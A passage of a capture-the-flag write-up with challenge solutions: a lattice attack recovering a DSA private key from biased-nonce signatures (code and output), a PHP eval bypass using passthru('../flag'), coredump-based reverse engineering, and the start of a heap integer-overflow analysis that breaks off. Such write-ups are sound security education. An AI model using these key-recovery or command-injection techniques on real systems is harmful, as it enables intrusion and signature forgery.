class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solver aria-label=Anchor>#</a></span></h3><p>We collected several signatures</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.PublicKey</span> <span class=kn>import</span> <span class=n>DSA</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>q</span> <span class=o>=</span> <span class=mi>739904609682520586736011252451716180456601329519</span>
</span></span><span class=line><span class=cl><span class=n>sign</span> <span class=o>=</span> <span class=p>[[</span><span class=mi>47817980213997116983990891662989699152988893000</span><span class=p>,</span> <span class=mi>550778919109238643794725030183918198033267410208</span><span class=p>,</span> <span class=mi>115707849027963465953307322004337573514841630363</span><span class=p>],</span> <span class=o>...</span>
</span></span></code></pre></div><p>We decided to implement a <a href=https://crypto.stackexchange.com/questions/44644/how-does-the-biased-k-attack-on-ecdsa-work target=_blank>modified version</a> of the algorithm in the paper which is (allegedly) faster.</p><p>The goal is to have <code>m.LLL(...)[0][-1] == 1</code>. It the condition is satisfied, we have found the privatekey.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>M</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>u</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sign</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span><span class=o>.</span><span class=n>append</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>sign</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>*</span> <span class=nb>pow</span><span class=p>(</span><span class=n>sign</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>2</span><span class=p>]</span> <span class=o>*</span> <span class=mi>2</span><span class=o>^</span><span class=mi>8</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=n>q</span><span class=p>))</span> <span class=o>%</span> <span class=n>q</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>u</span><span class=o>.</span><span class=n>append</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=o>-</span><span class=n>sign</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=nb>pow</span><span class=p>(</span><span class=n>sign</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>2</span><span class=p>]</span> <span class=o>*</span> <span class=mi>2</span><span class=o>^</span><span class=mi>8</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=n>q</span><span class=p>))</span> <span class=o>%</span> <span class=n>q</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>M0</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>a</span> <span class=ow>in</span> <span class=n>t</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>M0</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>a</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>M1</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=n>u</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>M1</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>b</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sign</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>Mi</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sign</span><span class=p>)</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>Mi</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>q</span>
</span></span><span class=line><span class=cl>    <span class=n>M</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>Mi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>M</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>M0</span> <span class=o>+</span> <span class=p>[</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>M</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>M1</span> <span class=o>+</span> <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sage.modules.free_module_integer</span> <span class=kn>import</span> <span class=n>IntegerLattice</span>
</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=n>IntegerLattice</span><span class=p>(</span><span class=n>M</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>m</span><span class=o>.</span><span class=n>LLL</span><span class=p>(</span><span class=n>delta</span><span class=o>=</span><span class=mf>0.999999999</span><span class=p>,</span> <span class=n>eta</span><span class=o>=</span><span class=mf>0.501</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span></code></pre></div><pre><code>Out[]: (...61262266441191146369913672082151254217822682617, 1)
</code></pre><h3 class="relative group">Final sanity check<div id=final-sanity-check class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#final-sanity-check aria-label=Anchor>#</a></span></h3><p>If we got it correctly, the following condition should be true:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>mx</span> <span class=o>=</span> <span class=mi>61262266441191146369913672082151254217822682617</span>
</span></span><span class=line><span class=cl><span class=n>y</span> <span class=o>=</span> <span class=mf>12813568285675088759086.</span><span class=o>..</span>
</span></span><span class=line><span class=cl><span class=n>g</span> <span class=o>=</span> <span class=mf>52865703933600072480340.</span><span class=o>..</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=mf>14577437014070574361928.</span><span class=o>..</span>
</span></span><span class=line><span class=cl><span class=nb>pow</span><span class=p>(</span><span class=n>g</span><span class=p>,</span> <span class=n>q</span> <span class=o>-</span> <span class=n>mx</span><span class=p>,</span> <span class=n>p</span><span class=p>)</span> <span class=o>==</span> <span class=n>y</span>
</span></span></code></pre></div><p>And it is! So we:</p><ol><li>Set privkey locally to 678642343241329440366097580369564926238778646902 and sign &ldquo;cat flag&rdquo;</li><li>Get a valid signature</li><li>Execute cat flag on remote</li><li>???</li><li>Profit</li></ol><h2 class="relative group">PHP Eval White-List<div id=php-eval-white-list class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#php-eval-white-list aria-label=Anchor>#</a></span></h2><p>For this challenge, we were given a <a href=http://c67f8ffd.quals2018.oooverflow.io/ target=_blank>webpage</a> written in PHP, as well as its source code and the binary of a custom PHP extension (that supposedly implements the whitelist to be bypassed). The goal was to execute a binary, <code>flag</code>, and read its output.</p><p>The page contains a simple form that takes a PHP code snippet, and <code>eval()</code>s it. The challenge was far easier than expected: <code>passthru</code> was allowed (as well as <code>system</code>), and just putting in the form <code>passthru('../flag');</code> returned the flag :)</p><p>Flag: <code>OOO{Fortunately_php_has_some_rock_solid_defense_in_depth_mecanisms,_so-everything_is_fine.}</code></p><h2 class="relative group">Ps-secure<div id=ps-secure class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#ps-secure aria-label=Anchor>#</a></span></h2><h3 class="relative group">Description<div id=description class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#description aria-label=Anchor>#</a></span></h3><p>The program was about to generate the flag when something went wrong. We have a coredump of the process.</p><h3 class="relative group">Pwn tutorial<div id=pwn-tutorial class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#pwn-tutorial aria-label=Anchor>#</a></span></h3><p>Process crashed on: <code>0x555555554e9a inc dword ptr [rax]</code> with <code>RAX 0x555555554e9a â—‚â€” inc dword ptr [rax]</code>, thus trying to write in a text segment caused segfault. We noticed that the original program had 4 args: <code>integer, integer, input file, output file</code></p><h4 class="relative group">By reversing program we understood that&mldr;<div id=by-reversing-program-we-understood-that class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#by-reversing-program-we-understood-that aria-label=Anchor>#</a></span></h4><p>The first two integers, namely <code>num1</code> and <code>num2</code>, in <code>argv</code> are used to seed 2 independent LCG.
Unfortunately <code>argv</code> was partially overwritten with <em>xxxx</em> by the program, so the original LCG states are lost.</p><p>The first function <code>sub_B3B</code> opens the input file, generates a random offset (using state num1) and seeks at this offset.
Then 128 bytes are read and stored in a heap buffer at address <code>0x5555557588b0</code>.</p><p>The program then calls <code>sub_B0A</code> which gets 1 byte offset from rand
to modify the caller stack frame by adding this offset to the stored RIP. As such a function that calls <code>sub_B0A</code> does not return where it was called, but somewhere after that point.</p><p>Since the program flow depends on the output of <code>rand</code> and the initial state is unknown, we can&rsquo;t recreate the correct execution flow.
So we tried to recover <code>num1</code> and <code>num2</code> from the stack when the process crashed, specifically at addresses <code>0x7fffffffec90</code> and <code>0x7fffffffec94</code>, respectively. We also noticed that the state <code>num2</code> is only used by <code>sub_B0A</code>, while <code>num1</code> is used for all the remaining rand calls (<em>i.e.</em>, seek offset, aligner, flag gen).</p><p>Knowing the last state of <code>num2</code> we calculated both the previous states and the corresponding rand output. In order to identify the inital <code>num2</code> state, we tried to identify which value would make sense for the first <code>sub_B0A</code> call.</p><p>The function <code>noise_loader</code> (called from main <code>@0x1159</code>) has saved return address <code>0x115E</code>, so we assumed that the modified RIP would point to <code>0x0118D</code>. As a result the random offset must be <code>0x0118D - 0x115E = 47</code>. Now we have calculated the list of <code>num2</code> states starting from the last and back to the (found to be) initial one:</p><pre tabindex=0><code>state_num2[0] -&gt; 2031993358 

state_num2[-1] -&gt; 1480659687 
rand() -&gt; 29 # offset of third sub_B0A

state_num2[-2] -&gt; 2318365684 
rand() -&gt; 65 # offset of second sub_B0A

state_num2[-3]: 10821 # i.e. initial arvg[2]
rand() -&gt; 47 # offset of first sub_B0A
</code></pre><h4 class="relative group">At this stage we can reconstruct the real flow of the program:<div id=at-this-stage-we-can-reconstruct-the-real-flow-of-the-program class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#at-this-stage-we-can-reconstruct-the-real-flow-of-the-program aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>func_ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>filename</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>num1</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>num2</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Thanks for choosing Ps Security</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>argc</span> <span class=o>&lt;=</span> <span class=mi>4</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Not enough parameters</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>4</span><span class=p>])</span> <span class=o>&gt;</span> <span class=mh>0x1F</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Filename too long</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>num1</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=n>num2</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;x&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span> <span class=o>++</span><span class=n>j</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;x&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>sub_B3B</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>3</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>num1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>num2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>sub_E51</span><span class=p>(</span><span class=o>&amp;</span><span class=n>num1</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>num2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>strcpy</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>4</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nf>strcat</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=s>&#34;.tXt&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>func_ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>sub_E51</span> <span class=o>+</span> <span class=p>(</span><span class=kt>signed</span> <span class=kt>int</span><span class=p>)</span><span class=nf>rand_</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>num1</span><span class=p>)</span> <span class=o>%</span> <span class=mi>65</span> <span class=o>+</span> <span class=mh>0x1C</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Hold your breath..</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=p>((</span><span class=kt>void</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>*</span><span class=p>)(</span><span class=kt>char</span> <span class=o>*</span><span class=p>,</span> <span class=kt>int</span> <span class=o>*</span><span class=p>,</span> <span class=kt>int</span> <span class=o>*</span><span class=p>))</span><span class=n>func_ptr</span><span class=p>)(</span><span class=n>filename</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>num1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>num2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// which actually corresponds to sub_E9F(filename, &amp;num1, &amp;num2);
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int64_t</span> <span class=nf>sub_E51</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=n>num1</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=n>num2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>sub_B0A</span><span class=p>(</span><span class=n>num2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>sub_BD2</span><span class=p>(</span><span class=n>num1</span><span class=p>,</span> <span class=n>num2</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>At end of main there is a function call that uses <code>sub_E51</code> as base address, adding a random offset computed from <code>rand(num1)</code>.
We noticed that <code>strcat(filename, ".tXt")</code> caused an overflow that overwrites the value of <code>num1</code> with <code>"tXt\x00"</code>: this makes the subsequent rand call to produce a bad offset which then made the program crash.</p><p>Here we started to make educated guesses on the offset that would produce the correct call: the allowed address range is <code>[0xE51+0x1C, 0xE51+0x1C+0x40]</code>. Probably the most correct address in this range is the beginning of <code>sub_E9F</code> that, guess what, computes and prints the flag! However, <code>sub_E9F</code> uses <code>rand(num1)</code> to compute the flag so we still needed to recover the correct <code>num1</code> state. We identified a set of constraints to calculate this value:</p><ul><li>The first rand value is equal to the seek position (fseek value recovered from the FILE struct in the heap)</li><li>In function <code>sub_BD2</code> rand rand is repeatedly called until <code>rand(num1) == 0</code>.
This function prints a dot every 50 iterations and <code>"\n "</code> every 50 dots.
We know that this functions gets called since, looking at the printf heap buffer <code>@0x555555757260</code>, we can tell that at least one full line of dots has been printed and the last line had 30 dots.</li><li>So the number of iterations of the while is <code>2500 + 2500*k + 1500 + [0,49]</code></li><li>The last rand call is used to calculate <code>func_ptr</code> so <code>rand(num1) % 65 == 50</code></li></ul><p>Using these constraints we tested every possible num1 state value and we have identified about 30 candidates.
As a final step we implemented the code that generates the flag in C and&mldr; the first generated flag was correct /o\</p><h4 class="relative group">Followed a proper Italian-style celebration!<div id=followed-a-proper-italian-style-celebration class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#followed-a-proper-italian-style-celebration aria-label=Anchor>#</a></span></h4><h2 class="relative group">Race Wars<div id=race-wars class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#race-wars aria-label=Anchor>#</a></span></h2><h3 class="relative group">Description:<div id=description-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#description-1 aria-label=Anchor>#</a></span></h3><p>Jhonny: I gotta get you racing again so I can make some money off your ass.
Me: We&rsquo;ll see..</p><h3 class="relative group">First checks:<div id=first-checks class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#first-checks aria-label=Anchor>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ file ./racewars: ELF 64-bit LSB executable, x86-64, version <span class=m>1</span> <span class=o>(</span>SYSV<span class=o>)</span>, dynamically linked
</span></span><span class=line><span class=cl>$ checksec --file ./racewars: 
</span></span><span class=line><span class=cl>    Arch:     amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
</span></span><span class=line><span class=cl>    Stack:    Canary found
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      No PIE <span class=o>(</span>0x400000<span class=o>)</span>
</span></span></code></pre></div><h3 class="relative group">After some hours of reversing<div id=after-some-hours-of-reversing class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#after-some-hours-of-reversing aria-label=Anchor>#</a></span></h3><p>We reversed all the basic interaction functions. Such as: choose_engine(), choose_chassis(), etc.. Most of them are just
fake and do not allow you to actually make a choice.</p><p>We understood that upgrade_transmission(transmission_struct * transmission) could have been the game winner. In fact it doas
not carefully checks for memory bounds when upgrading the Nth gear ratio. If transmission->gears_num is set to 0xffffffffffffffff
then you can easily gain both arbitrary read and write (byte per byte).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>upgrade_transmission</span><span class=p>(</span><span class=n>transmission_struct</span> <span class=o>*</span><span class=n>transmission</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>inserted_value</span><span class=p>;</span> <span class=c1>// [rsp+10h] [rbp-20h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>confirm</span><span class=p>;</span> <span class=c1>// [rsp+18h] [rbp-18h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>selected_gear</span><span class=p>;</span> <span class=c1>// [rsp+20h] [rbp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// [rsp+28h] [rbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v5</span> <span class=o>=</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>inserted_value</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>confirm</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>selected_gear</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;ok, you have a transmission with %zu gears</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>transmission</span><span class=o>-&gt;</span><span class=n>gears_num</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;which gear to modify? &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%zu&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>inserted_value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>transmission</span><span class=o>-&gt;</span><span class=n>gears_num</span> <span class=o>&gt;</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int64</span><span class=p>)</span><span class=o>--</span><span class=n>inserted_value</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span>
</span></span><span class=line><span class=cl>      <span class=s>&#34;gear ratio for gear %zu is %zu, modify to what?: &#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>inserted_value</span> <span class=o>+</span> <span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>transmission</span><span class=o>-&gt;</span><span class=n>ratios</span><span class=p>[</span><span class=n>inserted_value</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=n>selected_gear</span> <span class=o>=</span> <span class=n>inserted_value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%zu&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>inserted_value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;set gear to %d</span><span class=se>\n</span><span class=s>? (1 = yes, 0 = no)&#34;</span><span class=p>,</span> <span class=n>inserted_value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%zu&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>confirm</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>confirm</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=n>transmission</span><span class=o>-&gt;</span><span class=n>ratios</span><span class=p>[</span><span class=n>selected_gear</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>inserted_value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;ERROR: can&#39;t modify this gear.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>)</span> <span class=o>^</span> <span class=n>v5</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>So we started searching for a bug that could give us the chance to overwrite that variable.
We basically reversed all of the functions, including the ones handling the custom allocator used
by the program. It was intersting to notice that the custom heap management would not put any
boundaries between its allocation. For instance a transmission_struct could have been right next
to a chassis one with no chunk headers or any byte separating them.</p><h3 class="relative group">We finally found the bug<div id=we-finally-found-the-bug class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#we-finally-found-the-bug aria-label=Anchor>#</a></span></h3><p>After hours spent reversing we realized the bug was instead under our eyes all the time.
The choose_tires() function (fragment below) is in fact asking for how many pairs of tires we want for our car.
For obvious reasons we must input a number grater or equal then 2. This input is then multiplied for 32
(the size of tire_struct) and passed to get_object_memory() function as its argument.
We can just adjust the number of tires to pass the check but overflow the integer to trigger a get_object_memory(0).
